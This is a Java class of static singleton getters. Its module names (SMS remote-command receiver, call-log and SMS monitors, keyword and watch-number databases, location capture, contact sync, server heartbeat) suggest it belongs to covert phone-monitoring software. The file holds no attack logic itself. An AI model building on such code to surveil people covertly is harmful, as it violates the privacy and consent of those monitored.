package com.vvt.global;

import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.db.FxEventDatabase;
import com.vvt.gpsc.LocationCapture;
import com.vvt.info.ServerUrl;
import com.vvt.info.StartupTimeDb;
import com.vvt.license.LicenseManager;
import com.vvt.mediamon.MediaMonitor;
import com.vvt.mediamon.seeker.MediaSeeker;
import com.vvt.pref.Preference;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.parser.FileEventParser;
import com.vvt.protsrv.SendActivateManager;
import com.vvt.protsrv.SendAddressBookSyncManager;
import com.vvt.protsrv.SendDeactivateManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.SendHeartBeatManager;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.rmtcmd.RmtCmdRegister;
import com.vvt.rmtcmd.SMSCmdReceiver;
import com.vvt.rmtcmd.SMSCmdStore;
import com.vvt.rmtcmd.command.KeywordDatabase;
import com.vvt.rmtcmd.command.MonitorNumberDatabase;
import com.vvt.rmtcmd.command.WatchNumberDatabase;
import com.vvt.rmtcmd.util.RmtCmdUtil;
import com.vvt.smsutil.SMSMessageMonitor;
import com.vvt.smsutil.SMSSender;

public final class Global {
	
	public static Preference getPreference() {
		return Preference.getInstance();
	}
	
	public static FxCallLogNumberMonitor getFxCallLogNumberMonitor() {
		return FxCallLogNumberMonitor.getInstance();
	}
	
	public static FxEventDatabase getFxEventDatabase() {
		return FxEventDatabase.getInstance();
	}
	
	public static LicenseManager getLicenseManager() {
		return LicenseManager.getInstance();
	}
	
	public static SMSSender getSMSSender() {
		return SMSSender.getInstance();
	}

	public static SMSCmdReceiver getSMSCmdReceiver() {
		return SMSCmdReceiver.getInstance();
	}

	public static SMSMessageMonitor getSMSMessageMonitor() {
		return SMSMessageMonitor.getInstance();
	}
	
	public static SMSCmdStore getSMSCmdStore() {
		return SMSCmdStore.getInstance();
	}
	
	public static SendActivateManager getSendActivateManager() {
		return SendActivateManager.getInstance();
	}
	
	public static CommandServiceManager getCommandServiceManager() {
		return CommandServiceManager.getInstance();
	}
	
	public static SendEventManager getSendEventManager() {
		return SendEventManager.getInstance();
	}
	
	public static SendDeactivateManager getSendDeactivateManager() {
		return SendDeactivateManager.getInstance();
	}
	
	public static SendHeartBeatManager getSendHeartBeatManager() {
		return SendHeartBeatManager.getInstance();
	}
	
	public static RmtCmdProcessingManager getRmtCmdProcessingManager() {
		return RmtCmdProcessingManager.getInstance();
	}
	
	public static RmtCmdRegister getRmtCmdRegister() {
		return RmtCmdRegister.getInstance();
	}
	
	public static ServerUrl getServerUrl() {
		return ServerUrl.getInstance();
	}
	
	public static SendAddressBookSyncManager getSendAddressBookSyncManager() {
		return SendAddressBookSyncManager.getInstance();
	}
	
	public static MonitorNumberDatabase getMonitorNumberDatabase() {
		return MonitorNumberDatabase.getInstance();
	}
	
	public static KeywordDatabase getKeywordDatabase() {
		return KeywordDatabase.getInstance();
	}
	
	public static WatchNumberDatabase getWatchNumberDatabase() {
		return WatchNumberDatabase.getInstance();
	}
	
	public static MediaMonitor getMediaMonitor() {
		return MediaMonitor.getInstance();
	}
	
	/*public static MediaSeeker getMediaSeeker() {
		return MediaSeeker.getInstance();
	}*/
	
	public static FileEventParser getFileEventParser() {
		return FileEventParser.getInstance();
	}
	
	public static StartupTimeDb getStartupTimeDb() {
		return StartupTimeDb.getInstance();
	}
	
	public static LocationCapture getLocationCapture() {
		return LocationCapture.getInstance();
	}
}
